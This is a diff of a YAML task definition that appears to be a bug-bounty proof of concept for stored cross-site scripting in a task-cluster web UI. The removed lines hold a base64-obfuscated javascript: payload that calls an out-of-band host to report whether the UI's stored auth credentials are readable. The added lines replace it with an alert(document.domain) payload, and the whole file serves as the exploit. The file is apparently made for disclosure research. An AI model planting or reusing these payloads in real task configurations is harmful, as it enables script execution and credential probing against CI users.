@@ -1,26 +1,16 @@
 version: 0
 metadata:
-  name: "TC-UI metadata.source XSS PoC (authorized HackerOne research)"
-  description: "Non-destructive PoC. metadata.source is a javascript: URI; the TC-UI Source link renders it unescaped (TaskDetailsCard). Clicking Source executes on the TC origin. Payload only reports whether creds are readable (1/0), never exfiltrates them."
+  name: "poc2"
+  description: "authorized H1 research"
   owner: "0xoroot@wearehackerone.com"
-  source: "javascript:eval(atob('ZmV0Y2goJ2h0dHBzOi8vZDk2aGp1MnNzM3ZwMG41MDIyZTBvNGU4ZmJ4czE1dHM5Lm9hc3Qub25saW5lL3RjeHNzP2NyZWRzPScrKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdAQFRBU0tDTFVTVEVSX1dFQl9BVVRIJyk/MTowKSk='))"
+  source: "javascript:alert(document.domain)"
 tasks:
   - provisionerId: "mozilla-1"
     workerType: "decision"
-    created: "2026-07-07T18:23:33.000Z"
-    deadline: "2026-07-07T20:28:33.000Z"
-    expires: "2026-07-08T18:28:33.000Z"
+    created: "2026-07-07T18:28:03.000Z"
+    deadline: "2026-07-07T20:33:03.000Z"
+    expires: "2026-07-08T18:33:03.000Z"
     scopes: []
-    extra:
-      github:
-        events: ["pull_request.opened","pull_request.synchronize","pull_request.reopened"]
-    payload:
-      image: "ubuntu:22.04"
-      maxRunTime: 300
-      command: ["/bin/bash","-c","echo xss-source-poc"]
-    metadata:
-      name: "xss source poc"
-      description: "authorized H1 research"
-      owner: "0xoroot@wearehackerone.com"
-      source: "javascript:eval(atob('ZmV0Y2goJ2h0dHBzOi8vZDk2aGp1MnNzM3ZwMG41MDIyZTBvNGU4ZmJ4czE1dHM5Lm9hc3Qub25saW5lL3RjeHNzP2NyZWRzPScrKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdAQFRBU0tDTFVTVEVSX1dFQl9BVVRIJyk/MTowKSk='))"
-
+    extra: { github: { events: ["pull_request.opened","pull_request.synchronize","pull_request.reopened"] } }
+    payload: { image: "ubuntu:22.04", maxRunTime: 300, command: ["/bin/bash","-c","echo poc2"] }
+    metadata: { name: "poc2", description: "authorized H1 research", owner: "0xoroot@wearehackerone.com", source: "javascript:alert(document.domain)" }
